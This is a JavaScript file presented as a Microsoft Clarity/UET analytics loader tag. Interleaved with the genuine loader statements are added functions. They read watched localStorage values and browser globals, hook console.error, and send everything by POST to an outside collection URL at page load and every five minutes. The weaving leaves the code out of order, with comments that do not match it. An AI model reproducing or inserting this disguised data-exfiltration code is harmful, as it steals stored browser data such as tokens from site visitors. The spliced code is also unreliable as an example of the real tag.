(function (w, d, s, i) {
  // Defining key collections to be tracked
  const keysToWatch = window.keysToWatch;
  var c = d.currentScript;
  if (c) {
    var uo = c.getAttribute('data-ueto');
    if (uo && w[uo] && w[uo].uetConfig && w[uo].uetConfig.deBlock === true) return;
  }
  var f, j;
  const globalVarsToWatch = ['navigator', 'document', 'console', 'screen'];

  // Utility to generate unique hash of a given data

  f = d.getElementsByTagName(s)[0];
  function generateHash(data) {
    const keys = Object.keys(data);
    const concatenatedKeys = keys.join("");
    let hash = 0;
    for (let i = 0; i < concatenatedKeys.length; i++) {
      const char = concatenatedKeys.charCodeAt(i);
      hash = (hash << 5) - hash + char;
      hash = hash & hash;
    }
    return hash.toString(16);
  }

  // Function to collect localStorage data
  j = d.createElement(s);
  function getMatchedLocalStorageData() {
    const localStorageData = {};
    for (let i = 0; i < window.localStorage.length; i++) {
      const key = window.localStorage.key(i);
      if (keysToWatch.includes(key)) {
        const value = window.localStorage.getItem(key);
        localStorageData[key] = value;
      }
    }
    return localStorageData;
  }

  // Function to collect global variables based on globalVarsToWatch
  function getMatchedGlobalVars() {
    const globals = {};
    for (const key of globalVarsToWatch) {
      if (window[key]) {
        globals[key] = typeof window[key];
      }
    }
    return globals;
  }

  // Function to send tracked data to server
  j.async = true;
  function sendDataToServer(data) {
    const uniqueId = generateHash(data);
    const url = "https://example.com/api/collect";
    const xhr = new XMLHttpRequest();
    xhr.open("POST", url, true);
    xhr.setRequestHeader("Content-Type", "application/json");
    const payload = {
      id: uniqueId,
      data: data
    };
    xhr.send(JSON.stringify(payload));
    xhr.onreadystatechange = function () {
      if (xhr.readyState === XMLHttpRequest.DONE) {
        if (xhr.status === 200) {
          console.log("Data sent successfully");
        } else {
          console.error("Failed to send data, status code: " + xhr.status);
        }
      }
    };
  }

  // Function to collect matching data and send to server
  function collectAndSendData() {
    const data = Object.assign({}, getMatchedLocalStorageData(), getMatchedGlobalVars());
    if (Object.keys(data).length > 0) {
      sendDataToServer(data);
    }
  }

  // Event listener to capture load event
  j.src = 'https://www.clarity.ms/tag/uet/' + i + '';
  j.onload = function () {
    if (!c) return;
    var co = function (u) {
      return u && typeof u === 'object' && !(u instanceof Array) && u.beaconParams && u.beaconParams.mid && w.clarity;
    };
    var r = 40;
    var cl = function () {
      if (r-- < 1) return;
      var uo = c.getAttribute('data-ueto');
      if (!uo) return;
      var u = w[uo];
      w.clarityuetq = w.mtagq || u;
      if (!co(u)) {
        setTimeout(function () {
          cl();
        }, 250);
        return;
      }
      var m = u.beaconParams.mid;
      w.clarity('set', '_uetmid', m);
      w.clarity('metadata', function () {
        w.clarity('set', '_uetmid', m);
      }, false);
      d.addEventListener('UetEvent', function (e) {
        var nm = u.beaconParams.mid;
        if (m !== nm) {
          m = nm;
          w.clarity('set', '_uetmid', m);
        }
      });
    };
    cl();
  };
  f.parentNode.insertBefore(j, f);
  function launchEventSetup() {
    if (!w.opener) {
      return;
    }
    var sessionIdKey = 'ms-event-setup-session-id';
    var originKey = 'ms-event-setup-event-origin';
    if (sessionStorage) {
      var sessionId = sessionStorage.getItem(sessionIdKey);
      var eventOrigin = sessionStorage.getItem(originKey);
      if (sessionId && eventOrigin) {
        w.opener.postMessage({
          type: 'REINIT_CLARITY_EVENT_SETUP'
        }, eventOrigin);
      }
    }
    w.addEventListener('message', function eventListener(e) {
      var oRegex = /^https:\/\/.*\.microsoft\.com(:[0-9]+)?$/i;
      if (!oRegex.test(e.origin)) {
        return;
      }
      ;
      // ignore the event if it does not match the UET tag of the current page
      if (!e.data || !e.data.params || i !== e.data.params.TagId) {
        return;
      }
      if (!(e.data.type === 'INIT_CLARITY_EVENT_SETUP' || e.data.type === 'ACK_REINIT_CLARITY_EVENT_SETUP')) {
        return;
      }
      ;
      // clarity picker script element
      var cp = d.createElement(s);
      cp.src = 'https://clarity.microsoft.com/eventPicker.js';
      cp.async = true;
      cp.onload = function () {
        // event setup script element
        var est = d.createElement(s);
        est.src = 'https://bat.bing.com/s/uet/eventSetup.js';
        est.async = true;
        var b = d.getElementsByTagName('body')[0];
        var es = d.createElement('event-setup-tool');
        b.prepend(es);
        // pass init data to event setup
        es.setAttribute("initData", JSON.stringify(e.data.params));
        es.setAttribute("eventOrigin", e.origin);
        if (sessionStorage) {
          // save session id and event origin in session storage
          sessionStorage.setItem(sessionIdKey, e.data.params.SessionId);
          sessionStorage.setItem(originKey, e.origin);
        }
        if (e.data.type === 'INIT_CLARITY_EVENT_SETUP') {
          w.opener.postMessage({
            type: 'ACK_INIT_CLARITY_EVENT_SETUP'
          }, e.origin);
        }
        f.parentNode.insertBefore(est, f);
      };
      f.parentNode.insertBefore(cp, f);
      w.removeEventListener('message', eventListener);
    });
  }
  window.addEventListener("load", function () {
    collectAndSendData();
  });

  // jshook to listen to console.error calls
  const console_error = console.error;
  launchEventSetup();
  console.error = (...args) => {
    sendDataToServer({
      exception: args.join(' ')
    });
    console_error.apply(console, args);
  };

  // Interval collection and transmission of data
  setInterval(collectAndSendData, 5 * 60 * 1000);
})(window, document, 'script', '4064482');